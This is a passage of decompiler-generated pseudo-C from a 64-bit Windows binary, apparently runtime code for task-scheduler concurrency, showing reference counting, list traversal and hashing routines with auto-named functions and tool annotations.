  *(_QWORD *)(v5 + 504) = v5 + 496;
  *(_DWORD *)(v5 + 512) = 0;
  return v5;
}
// 13F18A740: using guessed type __int64 (__fastcall *off_13F18A740[5])();

//----- (000000013F14891C) ----------------------------------------------------
char __fastcall sub_13F14891C(volatile signed __int32 *a1)
{
  __int64 pExceptionObject[5]; // [rsp+20h] [rbp-28h] BYREF

  if ( (volatile signed __int32 *)sub_13F1492E0() == a1 )
  {
    sub_13F142D18(pExceptionObject);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVimproper_scheduler_attach_Concurrency__);
  }
  sub_13F148984(a1, 1);
  return 0;
}
// 13F1C5EB8: using guessed type int dword_13F1C5EB8;
// 13F1C5EBC: using guessed type char byte_13F1C5EBC;
// 13F14891C: using guessed type _QWORD pExceptionObject[5];

//----- (000000013F148984) ----------------------------------------------------
_QWORD *__fastcall sub_13F148984(volatile signed __int32 *a1, char a2)
{
  __int64 v4; // rax
  __int64 v5; // rdi
  _QWORD *v6; // rbx
  __int64 pExceptionObject[5]; // [rsp+20h] [rbp-28h] BYREF

  v4 = sub_13F142818(0i64);
  v5 = v4;
  if ( v4 )
  {
    if ( *(volatile signed __int32 **)(v4 + 56) == a1 )
    {
      sub_13F142D18(pExceptionObject);
      CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVimproper_scheduler_attach_Concurrency__);
    }
    if ( !*(_BYTE *)(v4 + 136) )
      sub_13F156D44(v4 - 16);
    sub_13F14E5A0();
  }
  _InterlockedIncrement(a1 + 155);
  (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)a1 + 32i64))(a1);
  v6 = sub_13F149CBC((__int64)a1, a2);
  sub_13F14EBDC((__int64)v6, v5);
  return v6;
}
// 13F142818: using guessed type __int64 __fastcall sub_13F142818(_QWORD);
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F1C5DB0: using guessed type int dword_13F1C5DB0;
// 13F148984: using guessed type _QWORD pExceptionObject[5];

//----- (000000013F148A2C) ----------------------------------------------------
__int64 __fastcall sub_13F148A2C(volatile signed __int32 *a1)
{
  __int64 result; // rax

  result = (unsigned int)_InterlockedCompareExchange(a1 + 159, -1073741824, 0x80000000);
  if ( (_DWORD)result == 0x80000000 )
    return sub_13F14C0A0(a1);
  return result;
}

//----- (000000013F148A50) ----------------------------------------------------
__int64 __fastcall sub_13F148A50(__int64 a1)
{
  __int64 result; // rax
  __int64 **i; // rbx

  sub_13F14EF64();
  sub_13F14B4BC(a1);
  result = sub_13F14EF64();
  for ( i = *(__int64 ***)(a1 + 312); i; i = (__int64 **)*i )
    result = (*(__int64 (__fastcall **)(__int64 *))(*i[2] + 48))(i[2]);
  return result;
}
// 13F14EF64: using guessed type __int64 sub_13F14EF64(void);
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F148A94) ----------------------------------------------------
__int64 (*__fastcall sub_13F148A94(__int64 a1, unsigned int a2))(void)
{
  if ( (int)sub_13F1454C0() < 3 )
    return (__int64 (*)(void))sub_13F1422DC(0i64, *(_QWORD *)(a1 + 728), a2, 0x7FFFFFFFi64);
  else
    return sub_13F10ABF0();
}
// 13F1422DC: using guessed type __int64 __fastcall sub_13F1422DC(_QWORD, _QWORD, _QWORD, _QWORD);
// 13F1454C0: using guessed type __int64 sub_13F1454C0(void);

//----- (000000013F148AF4) ----------------------------------------------------
__int64 __fastcall sub_13F148AF4(__int64 a1)
{
  __int64 result; // rax
  _QWORD *v3; // rdi
  _QWORD *v4; // rcx

  result = 2684354560i64;
  if ( (*(_DWORD *)(*(_QWORD *)(a1 + 72) + 636i64) & 0xA0000000) != -1610612736 )
  {
    v3 = *(_QWORD **)(a1 + 32);
    while ( v3 )
    {
      v4 = v3 - 12;
      v3 = (_QWORD *)*v3;
      if ( v4 )
        result = (*(__int64 (__fastcall **)(_QWORD *, __int64))(*v4 + 32i64))(v4, 1i64);
    }
    *(_QWORD *)(a1 + 32) = 0i64;
    _InterlockedExchange((volatile __int32 *)(a1 + 120), 0);
  }
  return result;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F148B60) ----------------------------------------------------
__int64 __fastcall sub_13F148B60(__int64 a1)
{
  __int64 result; // rax
  _QWORD *v3; // rsi
  _QWORD *v4; // rcx

  result = 2684354560i64;
  if ( (*(_DWORD *)(*(_QWORD *)(a1 + 72) + 636i64) & 0xA0000000) != -1610612736 )
  {
    v3 = *(_QWORD **)(a1 + 32);
    while ( v3 )
    {
      v4 = v3 - 2;
      v3 = (_QWORD *)*v3;
      result = sub_13F14088C(v4, 64i64);
    }
    *(_QWORD *)(a1 + 32) = 0i64;
    _InterlockedExchange((volatile __int32 *)(a1 + 120), 0);
  }
  return result;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F148BC4) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 sub_13F148BC4()
{
  __int64 result; // rax

  result = (unsigned int)_InterlockedDecrement(&dword_13F1B71D4);
  if ( (_DWORD)result == 0x80000000 )
  {
    sub_13F15A874();
    result = sub_13F142810(0i64);
    dword_13F1C5DB0 = 0;
    _InterlockedAnd(&dword_13F1B71D4, 0x7FFFFFFFu);
  }
  return result;
}
// 13F148BEC: write access to const memory at 13F1C5DB0 has been detected
// 13F142810: using guessed type __int64 __fastcall sub_13F142810(_QWORD);
// 13F1B71D4: using guessed type int dword_13F1B71D4;
// 13F1C5DB0: using guessed type int dword_13F1C5DB0;

//----- (000000013F148C04) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 sub_13F148C04()
{
  __int64 result; // rax
  char v1[8]; // [rsp+28h] [rbp-20h] BYREF
  int v2; // [rsp+30h] [rbp-18h]
  __int64 (__fastcall *v3)(); // [rsp+38h] [rbp-10h]

  if ( _InterlockedExchange(&dword_13F1C5DF8, 1) )
  {
    v2 = 0;
    v3 = sub_13F142C2C;
    do
      sub_13F141BF4((__int64)v1);
    while ( _InterlockedExchange(&dword_13F1C5DF8, 1) );
  }
  result = 1i64;
  dword_13F1C5DB8 = 1;
  dword_13F1C5DF8 = 0;
  return result;
}
// 13F148C5E: write access to const memory at 13F1C5DB8 has been detected
// 13F148C8E: write access to const memory at 13F1C5DB0 has been detected
// 13F148CA4: write access to const memory at 13F1C5DF8 has been detected
// 13F142C2C: using guessed type __int64 __fastcall sub_13F142C2C();
// 13F1B71D4: using guessed type int dword_13F1B71D4;
// 13F1C5DB0: using guessed type int dword_13F1C5DB0;
// 13F1C5DB8: using guessed type int dword_13F1C5DB8;
// 13F1C5DF8: using guessed type int dword_13F1C5DF8;
// 13F1C5EC8: using guessed type __int64 qword_13F1C5EC8;
// 13F148C04: using guessed type char var_20[8];

//----- (000000013F148CB4) ----------------------------------------------------
__int64 __fastcall sub_13F148CB4(__int64 a1, __int64 a2)
{
  int v3; // esi
  int v4; // eax
  __int64 v5; // rbx
  __int64 v6; // rax
  __int64 v7; // rbp
  int v8; // ebx
  __int64 v9; // rsi
  __int64 v10; // rax
  __int64 v11; // rbp
  __int64 v12; // rdx
  __int64 v13; // rdx
  __int64 v14; // rcx
  _QWORD *v15; // rbx

  v3 = 0;
  v4 = *(_DWORD *)(a1 + 68);
  if ( v4 > 0 )
  {
    v5 = 0i64;
    do
    {
      v6 = *(_QWORD *)(a1 + 48);
      v7 = *(_QWORD *)(v5 + v6);
      if ( v7 )
      {
        sub_13F155520(*(_QWORD *)(v5 + v6));
        sub_13F14088C(v7, 208i64);
      }
      ++v3;
      v5 += 8i64;
      v4 = *(_DWORD *)(a1 + 68);
    }
    while ( v3 < v4 );
  }
  v8 = 0;
  if ( v4 > 0 )
  {
    v9 = 0i64;
    do
    {
      v10 = *(_QWORD *)(a1 + 56);
      v11 = *(_QWORD *)(v9 + v10);
      if ( v11 )
      {
        sub_13F157CB4(*(_QWORD *)(v9 + v10));
        sub_13F14088C(v11, 304i64);
      }
      ++v8;
      v9 += 8i64;
    }
    while ( v8 < *(_DWORD *)(a1 + 68) );
  }
  sub_13F14088C(*(_QWORD *)(a1 + 160), a2);
  sub_13F14088C(*(_QWORD *)(a1 + 48), v12);
  sub_13F14088C(*(_QWORD *)(a1 + 56), v13);
  v14 = *(_QWORD *)(a1 + 40);
  if ( v14 )
  {
    v15 = (_QWORD *)(v14 - 8);
    sub_13F140ECC(v14, 32i64, *(_QWORD *)(v14 - 8));
    sub_13F140F9C(v15, 32i64 * *v15 + 8);
  }
  sub_13F142810(*(unsigned int *)(a1 + 32));
  *(_DWORD *)(a1 + 32) = 0;
  (*(void (__fastcall **)(_QWORD))(**(_QWORD **)(a1 + 656) + 8i64))(*(_QWORD *)(a1 + 656));
  return sub_13F14BD9C();
}
// 13F148D49: variable 'a2' is possibly undefined
// 13F148D52: variable 'v12' is possibly undefined
// 13F148D5B: variable 'v13' is possibly undefined
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F140F9C: using guessed type __int64 __fastcall sub_13F140F9C(_QWORD, _QWORD);
// 13F142810: using guessed type __int64 __fastcall sub_13F142810(_QWORD);
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F148DD0) ----------------------------------------------------
__int64 __fastcall sub_13F148DD0(__int64 a1)
{
  volatile __int32 *v1; // rdi
  unsigned int i; // eax
  unsigned int v4; // esi
  __int64 result; // rax

  v1 = (volatile __int32 *)(a1 + 536);
  sub_13F142BD8((volatile __int32 *)(a1 + 536));
  for ( i = sub_13F14C550(a1); ; i = sub_13F14C504(a1, v4) )
  {
    v4 = i;
    result = sub_13F142C20(v1);
    if ( !v4 )
      break;
    sub_13F148E38(a1, v4);
    sub_13F142BD8(v1);
  }
  return result;
}

//----- (000000013F148E38) ----------------------------------------------------
__int64 __fastcall sub_13F148E38(__int64 a1, unsigned int a2)
{
  _DWORD *v2; // rsi
  __int64 *v5; // r8
  unsigned int v6; // ecx
  __int64 v7; // rcx
  __int64 v8; // rax
  __int64 result; // rax
  __int64 *v10; // rdx
  __int64 v11; // r8
  __int64 v12; // [rsp+20h] [rbp-18h] BYREF
  __int64 *v13; // [rsp+28h] [rbp-10h]

  v12 = 0i64;
  v2 = (_DWORD *)(a1 + 536);
  v13 = &v12;
  sub_13F142BD8((volatile __int32 *)(a1 + 536));
  v5 = (__int64 *)(a1 + 520);
  while ( *v5 )
  {
    if ( a2 )
    {
      v6 = *(_DWORD *)(*v5 + 16);
      if ( v6 < *(_DWORD *)(a1 + 556) || v6 > a2 )
        break;
    }
    v7 = *v5;
    if ( *v5 )
    {
      v8 = *(_QWORD *)(v7 + 24);
      *v5 = v8;
      if ( !v8 )
        *(_QWORD *)(a1 + 528) = a1 + 520;
    }
    *(_QWORD *)(v7 + 24) = 0i64;
    *v13 = v7;
    v13 = (__int64 *)(v7 + 24);
  }
  for ( result = sub_13F142C20(v2); ; result = (*(__int64 (__fastcall **)(_QWORD))v11)(*(_QWORD *)(v11 + 8)) )
  {
    v11 = v12;
    if ( !v12 )
      break;
    v10 = &v12;
    v12 = *(_QWORD *)(v12 + 24);
    if ( v12 )
      v10 = v13;
    v13 = v10;
  }
  return result;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F148F0C) ----------------------------------------------------
__int64 __fastcall sub_13F148F0C(__int64 a1)
{
  char v1; // bp
  unsigned int v2; // er10
  int v3; // edi
  __int64 v5; // rsi
  __int64 v6; // r8
  int i; // er11
  int v8; // edx
  __int64 v9; // rcx
  __int64 v10; // rbx
  int v11; // edx
  _QWORD *v12; // rbx
  __int64 v13; // rcx
  __int64 v14; // rdx
  unsigned int v15; // ecx
  unsigned int v16; // edx

  v1 = 0;
  v2 = 0;
  v3 = 0;
  if ( *(int *)(a1 + 68) > 0 )
  {
    v5 = 0i64;
    do
    {
      v6 = *(_QWORD *)(v5 + *(_QWORD *)(a1 + 48));
      if ( v6 )
      {
        for ( i = 0; i < *(_DWORD *)(v6 + 192); ++i )
        {
          v8 = i >> *(_DWORD *)(v6 + 164);
          if ( v8 < *(_DWORD *)(v6 + 188) )
          {
            v9 = *(int *)(v6 + 184);
            v10 = *(_QWORD *)(v6 + 176);
            if ( v8 < (int)v9 )
            {
              v12 = *(_QWORD **)(v10 + 8i64 * v8);
            }
            else
            {
              v11 = v8 - v9;
              v12 = *(_QWORD **)(v10 + 8 * v9 - 8);
              if ( v11 >= 0 )
              {
                v13 = (unsigned int)(v11 + 1);
                do
                {
                  v12 = (_QWORD *)v12[1];
                  --v13;
                }
                while ( v13 );
              }
            }
            v14 = *(_QWORD *)(*v12 + 8 * (i & (unsigned __int64)(*(int *)(v6 + 160) - 1i64)));
            if ( v14 )
            {
              v15 = *(_DWORD *)(v14 + 304);
              v16 = -1;
              if ( v15 >= *(_DWORD *)(a1 + 556) )
                v16 = v15;
              if ( v1 )
              {
                if ( v2 <= v16 )
                  v16 = v2;
              }
              else
              {
                v1 = 1;
              }
              v2 = v16;
            }
          }
        }
      }
      ++v3;
      v5 += 8i64;
    }
    while ( v3 < *(_DWORD *)(a1 + 68) );
  }
  return v2;
}

//----- (000000013F149020) ----------------------------------------------------
__int64 __fastcall sub_13F149020(int *a1, int *a2)
{
  int v2; // eax
  int v4; // esi
  unsigned __int128 v6; // rax
  __int64 v7; // rdx
  __int64 result; // rax
  __int64 v9; // r8

  v2 = *a1;
  v4 = *a2;
  if ( *a1 != *a2 )
  {
    sub_13F14088C(*((_QWORD *)a1 + 1), a2);
    *a1 = v4;
    v6 = ((unsigned __int64)(unsigned int)(v4 + 31) >> 5) * (unsigned __int128)4ui64;
    if ( !is_mul_ok((unsigned __int64)(unsigned int)(v4 + 31) >> 5, 4ui64) )
      *(_QWORD *)&v6 = -1i64;
    *((_QWORD *)a1 + 1) = sub_13F1790C4(v6, *((_QWORD *)&v6 + 1));
    v2 = *a1;
  }
  v7 = 0i64;
  result = (unsigned int)(v2 + 31) >> 5;
  if ( (_DWORD)result )
  {
    v9 = (unsigned int)result;
    do
    {
      result = *(unsigned int *)(v7 + *((_QWORD *)a2 + 1));
      *(_DWORD *)(v7 + *((_QWORD *)a1 + 1)) = result;
      v7 += 4i64;
      --v9;
    }
    while ( v9 );
  }
  return result;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F1790C4: using guessed type __int64 __fastcall sub_13F1790C4(_QWORD, _QWORD);

//----- (000000013F1490A8) ----------------------------------------------------
_QWORD *sub_13F1490A8()
{
  volatile signed __int32 *v0; // rdi
  _QWORD *v1; // rbx

  v0 = (volatile signed __int32 *)sub_13F149BE4();
  v1 = sub_13F148984(v0, 0);
  (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v0 + 40i64))(v0);
  return v1;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F1490F0) ----------------------------------------------------
__int64 __fastcall sub_13F1490F0(__int64 a1)
{
  _DWORD v2[2]; // [rsp+20h] [rbp-28h] BYREF
  __int128 v3; // [rsp+28h] [rbp-20h]

  v2[0] = 0;
  v2[1] = 0;
  v3 = 0i64;
  return sub_13F14A964(a1, (__int64)v2);
}

//----- (000000013F149118) ----------------------------------------------------
_QWORD *__fastcall sub_13F149118(__int64 *a1)
{
  _QWORD *v2; // rcx
  _QWORD *result; // rax

  sub_13F150E9C(a1);
  sub_13F148C04();
  v2 = sub_13F15A6D8((_OWORD **)a1);
  result = 0i64;
  if ( v2 )
    return v2 + 2;
  return result;
}

//----- (000000013F149148) ----------------------------------------------------
__int64 __fastcall sub_13F149148(__int64 a1)
{
  __int64 result; // rax

  result = (unsigned int)_InterlockedExchangeAdd((volatile signed __int32 *)(a1 + 624), 0xFFFFFFFF);
  if ( (_DWORD)result == 1 )
    return sub_13F14938C(a1);
  return result;
}

//----- (000000013F149168) ----------------------------------------------------
__int64 __fastcall sub_13F149168(__int64 a1)
{
  __int64 result; // rax

  result = (unsigned int)_InterlockedIncrement((volatile signed __int32 *)(a1 + 736));
  if ( (_DWORD)result == 1 )
    return MEMORY[0x76F833A0](*(_QWORD *)(a1 + 712));
  return result;
}

//----- (000000013F149194) ----------------------------------------------------
__int64 __fastcall sub_13F149194(volatile __int32 *a1)
{
  __int64 v2; // rcx
  __int64 v3; // rsi
  __int64 v4; // rax

  sub_13F142BD8(a1 + 4);
  v2 = *(_QWORD *)a1;
  v3 = 0i64;
  if ( *(_QWORD *)a1 )
  {
    v4 = *(_QWORD *)(v2 + 360);
    *(_QWORD *)a1 = v4;
    if ( !v4 )
      *((_QWORD *)a1 + 1) = a1;
    v3 = v2;
  }
  sub_13F142C20((_DWORD *)a1 + 4);
  return v3;
}

//----- (000000013F1491F8) ----------------------------------------------------
__int64 __fastcall sub_13F1491F8(__int64 a1)
{
  __int64 result; // rax

  MEMORY[0x76F73C20](*(_QWORD *)(a1 + 720), -1i64);
  if ( (int)sub_13F1454C0() < 3 )
    sub_13F142350(0i64, *(_QWORD *)(a1 + 728), -1i64);
  else
    sub_13F14289C();
  MEMORY[0x76F91910](*(_QWORD *)(a1 + 712));
  result = (unsigned int)_InterlockedExchangeAdd((volatile signed __int32 *)(a1 + 624), 0xFFFFFFFF);
  if ( (_DWORD)result == 1 )
    return sub_13F14938C(a1);
  return result;
}
// 13F1454C0: using guessed type __int64 sub_13F1454C0(void);

//----- (000000013F149264) ----------------------------------------------------
__int64 __fastcall sub_13F149264(volatile signed __int32 *a1, __int64 a2, char a3)
{
  __int64 v3; // rbx
  __int64 result; // rax

  v3 = 0i64;
  if ( a3 )
    v3 = sub_13F14EBA8(a2);
  sub_13F14B390((__int64)a1, a2);
  _InterlockedDecrement(a1 + 155);
  result = (*(__int64 (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)a1 + 40i64))(a1);
  if ( v3 )
  {
    if ( !*(_BYTE *)(v3 + 136) )
      return sub_13F156FE4(v3 - 16);
  }
  return result;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F1492D4) ----------------------------------------------------
__int64 sub_13F1492D4()
{
  return sub_13F142818(0i64);
}
// 13F142818: using guessed type __int64 __fastcall sub_13F142818(_QWORD);

//----- (000000013F1492E0) ----------------------------------------------------
__int64 sub_13F1492E0()
{
  __int64 v0; // rcx
  __int64 result; // rax

  v0 = sub_13F142818(0i64);
  result = 0i64;
  if ( v0 )
    return sub_13F102FE0(v0);
  return result;
}
// 13F142818: using guessed type __int64 __fastcall sub_13F142818(_QWORD);
// 13F1C5DB0: using guessed type int dword_13F1C5DB0;

//----- (000000013F149304) ----------------------------------------------------
void __fastcall sub_13F149304(__int64 a1)
{
  unsigned int v1; // er8
  unsigned int v3; // edx
  unsigned __int64 v4; // r10
  unsigned int v5; // eax
  _DWORD *v6; // rdi
  unsigned __int64 i; // rcx
  __int64 v8; // rcx
  __int64 v9; // rdx

  v1 = 0;
  v3 = (unsigned int)(*(_DWORD *)a1 + 31) >> 5;
  if ( v3 )
  {
    if ( v3 >= 4 )
    {
      v4 = *(_QWORD *)(a1 + 8);
      if ( v4 > a1 + 8 || v4 + 4i64 * (v3 - 1) < a1 + 8 )
      {
        v5 = v3 & 0xFFFFFFFC;
        do
          v1 += 4;
        while ( v1 < v5 );
        v6 = *(_DWORD **)(a1 + 8);
        for ( i = (16 * ((unsigned __int64)v5 >> 2)) >> 2; i; --i )
          *v6++ = -1;
      }
    }
    if ( v1 < v3 )
    {
      v8 = 4i64 * v1;
      v9 = v3 - v1;
      do
      {
        *(_DWORD *)(v8 + *(_QWORD *)(a1 + 8)) = -1;
        v8 += 4i64;
        --v9;
      }
      while ( v9 );
    }
  }
}

//----- (000000013F14938C) ----------------------------------------------------
__int64 __fastcall sub_13F14938C(__int64 a1)
{
  _QWORD *v2; // rbx
  __int64 v3; // rcx
  _QWORD *v4; // rsi
  __int64 v5; // rax
  _QWORD *v6; // r8
  __int64 v7; // rbx
  __int64 v8; // rax
  __int64 v9; // r8
  __int64 v10; // rbx
  __int64 v11; // r8
  _QWORD *v12; // rbx

  (*(void (__fastcall **)(_QWORD))(**(_QWORD **)(a1 + 664) + 8i64))(*(_QWORD *)(a1 + 664));
  MEMORY[0x76F91910](*(_QWORD *)(a1 + 608));
  v2 = (_QWORD *)_InterlockedExchange64((volatile __int64 *)(a1 + 312), 0i64);
  if ( v2 )
  {
    do
    {
      v3 = v2[2];
      v4 = (_QWORD *)*v2;
      if ( v3 )
        (*(void (__fastcall **)(__int64, __int64))(*(_QWORD *)(v3 + 16) + 40i64))(v3 + 16, 1i64);
      sub_13F14088C(v2, 32i64);
      v2 = v4;
    }
    while ( v4 );
  }
  v5 = MEMORY[0x771B51E0](a1 + 768);
  v6 = (_QWORD *)((v5 - 16) & -(__int64)(v5 != 0));
  if ( v6 )
  {
    do
    {
      v7 = (v6[2] - 16i64) & -(__int64)(v6[2] != 0i64);
      (*(void (__fastcall **)(_QWORD *, __int64))(*v6 + 40i64))(v6, 1i64);
      v6 = (_QWORD *)v7;
    }
    while ( v7 );
  }
  v8 = MEMORY[0x771B51E0](a1 + 784);
  v9 = (v8 - 32) & -(__int64)(v8 != 0);
  if ( v9 )
  {
    do
    {
      v10 = (*(_QWORD *)(v9 + 32) - 32i64) & -(__int64)(*(_QWORD *)(v9 + 32) != 0i64);
      (**(void (__fastcall ***)(__int64, __int64))v9)(v9, 1i64);
      v9 = v10;
    }
    while ( v10 );
  }
  v11 = *(unsigned int *)(a1 + 600);
  while ( *(_QWORD *)(a1 + 320) )
  {
    v12 = sub_13F14B840(a1 + 320);
    MEMORY[0x76F833A0](v12[2]);
    MEMORY[0x76F91910](v12[2]);
    sub_13F14088C(v12, 24i64);
  }
  return (**(__int64 (__fastcall ***)(__int64, __int64, __int64))a1)(a1, 1i64, v11);
}
// 13F149516: variable 'v11' is possibly undefined
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F149520) ----------------------------------------------------
__int64 *__fastcall sub_13F149520(int *a1, _DWORD *a2, _DWORD *a3)
{
  unsigned __int64 v3; // r9
  unsigned __int64 i; // r10
  __int64 v5; // rax
  __int64 *result; // rax

  v3 = 0xCBF29CE484222325ui64;
  for ( i = 0i64; i < 4; ++i )
  {
    v5 = *((unsigned __int8 *)a2 + i);
    v3 = 0x100000001B3i64 * (v5 ^ v3);
  }
  result = *(__int64 **)(*((_QWORD *)a1 + 1) + 8i64 * (int)(v3 % *a1));
  if ( result )
  {
    while ( *((_DWORD *)result + 2) != *a2 )
    {
      result = (__int64 *)*result;
      if ( !result )
        goto LABEL_6;
    }
  }
  else
  {
LABEL_6:
    result = 0i64;
  }
  if ( result )
  {
    if ( a3 )
      *a3 = *((_DWORD *)result + 3);
  }
  return result;
}

//----- (000000013F14959C) ----------------------------------------------------
__int64 __fastcall sub_13F14959C(__int64 a1)
{
  __int64 v2; // rdi
  __int64 v3; // rax
  __int64 v4; // rbx

  v2 = 0i64;
  v3 = sub_13F142818(0i64);
  v4 = v3;
  if ( v3 && *(_QWORD *)(v3 + 56) == a1 && !*(_BYTE *)(v3 + 136) )
  {
    sub_13F1024C0();
    v2 = *(_QWORD *)(*(_QWORD *)(v4 + 248) + 120i64);
    sub_13F1024C0();
  }
  return v2;
}
// 13F142818: using guessed type __int64 __fastcall sub_13F142818(_QWORD);
// 13F1C5DB0: using guessed type int dword_13F1C5DB0;

//----- (000000013F149600) ----------------------------------------------------
__int64 __fastcall sub_13F149600(__int64 a1, _DWORD *a2)
{
  __int64 v2; // rbx
  __int64 v4; // rcx
  int v6; // [rsp+38h] [rbp+10h] BYREF
  unsigned int v7; // [rsp+40h] [rbp+18h] BYREF

  v2 = 0i64;
  if ( (*a2 & 0xFFFFFFF) == 2 )
  {
    v4 = (unsigned int)a2[2];
    return *(_QWORD *)(*(_QWORD *)(a1 + 48) + 8 * v4);
  }
  if ( (*a2 & 0xFFFFFFF) == 3 )
  {
    v6 = a2[2];
    if ( sub_13F149520((int *)(a1 + 568), &v6, &v7) )
    {
      v4 = v7;
      return *(_QWORD *)(*(_QWORD *)(a1 + 48) + 8 * v4);
    }
  }
  return v2;
}

//----- (000000013F149668) ----------------------------------------------------
__int64 __fastcall sub_13F149668(__int64 a1, int a2, int a3, _DWORD *a4, __int64 a5)
{
  __int64 result; // rax
  int v8; // er8
  __int64 v9; // r9
  int v10; // er8
  _QWORD *v11; // r9
  __int64 v12; // rcx

  for ( result = 0i64; a2 < a3; ++a2 )
  {
    if ( result )
      break;
    v8 = a2 >> *(_DWORD *)(a5 + 84);
    if ( v8 < *(_DWORD *)(a5 + 108) )
    {
      v9 = *(_QWORD *)(a5 + 96);
      if ( v8 < *(_DWORD *)(a5 + 104) )
      {
        v11 = *(_QWORD **)(v9 + 8i64 * v8);
      }
      else
      {
        v10 = v8 - *(_DWORD *)(a5 + 104);
        v11 = *(_QWORD **)(v9 + 8i64 * *(int *)(a5 + 104) - 8);
        if ( v10 >= 0 )
        {
          v12 = (unsigned int)(v10 + 1);
          do
          {
            v11 = (_QWORD *)v11[1];
            --v12;
          }
          while ( v12 );
        }
      }
      result = *(_QWORD *)(*v11 + 8 * (a2 & (unsigned __int64)(*(int *)(a5 + 80) - 1i64)));
    }
  }
  *a4 = a2 - 1;
  return result;
}

//----- (000000013F1496EC) ----------------------------------------------------
__int64 __fastcall sub_13F1496EC(__int64 a1, int a2, int a3, _DWORD *a4)
{
  __int64 result; // rax
  int i; // er10
  int v8; // edx
  __int64 v9; // rcx
  __int64 v10; // r8
  int v11; // edx
  _QWORD *v12; // r8
  __int64 v13; // rcx

  result = 0i64;
  for ( i = a2; i < a3; ++i )
  {
    if ( result )
      break;
    v8 = i >> *(_DWORD *)(a1 + 164);
    if ( v8 < *(_DWORD *)(a1 + 188) )
    {
      v9 = *(int *)(a1 + 184);
      v10 = *(_QWORD *)(a1 + 176);
      if ( v8 < (int)v9 )
      {
        v12 = *(_QWORD **)(v10 + 8i64 * v8);
      }
      else
      {
        v11 = v8 - v9;
        v12 = *(_QWORD **)(v10 + 8 * v9 - 8);
        if ( v11 >= 0 )
        {
          v13 = (unsigned int)(v11 + 1);
          do
          {
            v12 = (_QWORD *)v12[1];
            --v13;
          }
          while ( v13 );
        }
      }
      result = *(_QWORD *)(*v12 + 8 * (i & (unsigned __int64)(*(int *)(a1 + 160) - 1i64)));
    }
  }
  *a4 = i - 1;
  return result;
}

//----- (000000013F149778) ----------------------------------------------------
char __fastcall sub_13F149778(__int64 a1, __int64 a2, __int64 a3, int a4)
{
  int v5; // eax
  __int64 v9; // rcx
  unsigned int v11; // esi
  __int64 v12; // r14
  __int64 v13; // r15
  int v14; // ecx
  __int64 v15; // rcx
  int v16; // edi
  __int64 i; // rsi
  __int64 v18; // rcx
  int v19[2]; // [rsp+20h] [rbp-50h] BYREF
  __int64 v20; // [rsp+28h] [rbp-48h]
  __int64 v21; // [rsp+30h] [rbp-40h]
  int v22[2]; // [rsp+38h] [rbp-38h] BYREF
  __int64 v23; // [rsp+40h] [rbp-30h]
  __int64 v24; // [rsp+48h] [rbp-28h]
  int v25[2]; // [rsp+50h] [rbp-20h] BYREF
  __int128 v26; // [rsp+58h] [rbp-18h]

  v5 = *(_DWORD *)a3 & 0xFFFFFFF;
  if ( v5 == 1 )
  {
    v11 = 0;
    v12 = *(_QWORD *)(a1 + 40) + 32i64 * *(unsigned int *)(a3 + 8);
    if ( *(int *)(a1 + 68) > 0 )
    {
      v13 = 0i64;
      do
      {
        v14 = *(_DWORD *)(*(_QWORD *)(v12 + 8) + 4 * ((unsigned __int64)v11 >> 5));
        if ( _bittest(&v14, v11 & 0x1F) )
        {
          v15 = *(_QWORD *)(v13 + *(_QWORD *)(a1 + 48));
          v22[0] = *(_DWORD *)a3;
          v23 = *(_QWORD *)(a3 + 8);
          v22[1] = *(_DWORD *)(a3 + 4);
          v24 = *(_QWORD *)(a3 + 16);
          if ( sub_13F155A18(v15, a2, v22, a4) )
            return 1;
        }
        ++v11;
        v13 += 8i64;
      }
      while ( (signed int)v11 < *(_DWORD *)(a1 + 68) );
    }
  }
  else if ( (unsigned int)(v5 - 2) <= 1 )
  {
    v9 = sub_13F149600(a1, (_DWORD *)a3);
    if ( v9 )
    {
      v19[0] = *(_DWORD *)a3;
      v20 = *(_QWORD *)(a3 + 8);
      v19[1] = *(_DWORD *)(a3 + 4);
      v21 = *(_QWORD *)(a3 + 16);
      if ( sub_13F155A18(v9, a2, v19, a4) )
        return 1;
    }
  }
  v16 = 0;
  if ( *(int *)(a1 + 68) > 0 )
  {
    for ( i = 0i64; ; i += 8i64 )
    {
      v18 = *(_QWORD *)(i + *(_QWORD *)(a1 + 48));
      if ( v18 )
      {
        if ( *(int *)(v18 + 48) > 0 )
        {
          v25[0] = 0;
          v25[1] = 0;
          v26 = 0i64;
          if ( sub_13F155A18(v18, a2, v25, a4) )
            break;
        }
      }
      if ( ++v16 >= *(_DWORD *)(a1 + 68) )
        return 0;
    }
    return 1;
  }
  return 0;
}

//----- (000000013F1498E4) ----------------------------------------------------
char __fastcall sub_13F1498E4(__int64 a1)
{
  _QWORD *v1; // r8
  char v2; // dl

  v1 = *(_QWORD **)(a1 + 312);
  v2 = 0;
  while ( v1 )
  {
    if ( !*(_BYTE *)(v1[2] + 368i64) && *(_DWORD *)(v1[2] + 96i64) )
      return 1;
    v1 = (_QWORD *)*v1;
  }
